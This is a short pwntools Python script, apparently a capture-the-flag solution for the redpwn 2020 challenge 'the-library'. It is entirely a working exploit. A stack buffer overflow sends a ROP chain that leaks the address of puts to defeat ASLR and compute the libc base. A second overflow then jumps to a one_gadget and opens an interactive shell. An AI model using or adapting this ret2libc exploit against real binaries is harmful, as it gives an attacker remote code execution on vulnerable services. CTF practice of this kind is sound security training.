from pwn import *
host,port="2020.redpwnc.tf",31350
p = connect(host,port)
binary = ELF('./the-library')
libc = ELF('./libc.so.6')
JUNK = "A" * 24
main = binary.symbols['main']
got_puts = binary.got['puts']
plt_puts = binary.plt['puts']
pop_rdi = 0x400733


payload = JUNK
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(main)

p.recvline()
p.sendline(payload)
p.recvline()
p.recvline()
leaked_puts = u64(p.recvline().strip().ljust(8, "\x00"))
libc_puts = libc.symbols['puts']
libc.address = leaked_puts - libc_puts
log.success("Leaked puts :  {}".format(hex(leaked_puts)))
log.success("Libc at  :  {}".format(hex(libc.address)))


libc_base=libc.address
payload = JUNK
one_gadget = p64(libc.address + 0x4f2c5) 
payload+=one_gadget

p.recvline()
p.sendline(payload)
p.interactive()